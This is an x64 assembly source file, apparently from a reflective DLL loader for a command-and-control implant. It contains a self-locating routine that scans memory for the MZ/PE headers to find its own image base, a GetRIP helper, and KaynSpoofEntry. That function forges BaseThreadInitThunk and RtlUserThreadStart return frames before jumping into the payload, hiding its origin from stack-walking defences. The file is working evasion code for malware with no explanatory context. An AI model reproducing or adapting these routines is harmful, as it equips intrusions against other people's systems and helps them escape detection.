extern Entry

global Start
global GetRIP
global KaynCaller
global KaynSpoofEntry

section .text$A
	Start:
        push    rsi
        mov		rsi, rsp
        and		rsp, 0FFFFFFFFFFFFFFF0h

        sub		rsp, 020h
        call    Entry

        mov		rsp, rsi
        pop		rsi
    ret

section .text$F
    KaynCaller:
           call caller
       caller:
           pop rcx
       loop:
           xor rbx, rbx
           mov ebx, 0x5A4D
           inc rcx
           cmp bx,  [ rcx ]
           jne loop
           xor rax, rax
           mov ax,  [ rcx + 0x3C ]
           add rax, rcx
           xor rbx, rbx
           add bx,  0x4550
           cmp bx,  [ rax ]
           jne loop
           mov rax, rcx
       ret

    GetRIP:
        call    retptr

    retptr:
        pop	rax
        sub	rax, 5
    ret

    ; KaynSpoofEntry(Target, Arg1, Arg2, Arg3, FakeFrame1, FakeFrame2)
    ; Overwrites return addr with FakeFrame1 then JMPs to Target (never returns).
    ; rcx=Target, rdx=Arg1, r8=Arg2, r9=Arg3, [rsp+28h]=FakeFrame1, [rsp+30h]=FakeFrame2
    KaynSpoofEntry:
        mov   r10, rcx          ; r10 = Target (save before arg-shift overwrites rcx)
        mov   rcx, rdx          ; rcx = Arg1 (hDllBase for Target)
        mov   rdx, r8           ; rdx = Arg2 (Reason)
        mov   r8,  r9           ; r8  = Arg3 (lpReserved)
        xor   r9,  r9           ; r9  = 0 (unused 4th arg)
        mov   r11, [rsp+28h]    ; r11 = FakeFrame1 (BaseThreadInitThunk)
        mov   rax, [rsp+30h]    ; rax = FakeFrame2 (RtlUserThreadStart)
        mov   [rsp+00h], r11    ; overwrite return addr with FakeFrame1
        mov   [rsp+08h], rax    ; FakeFrame2 one slot above
        xor   rax, rax
        mov   [rsp+10h], rax    ; NULL stack terminator
        jmp   r10               ; JMP to Target; DemonMain never returns
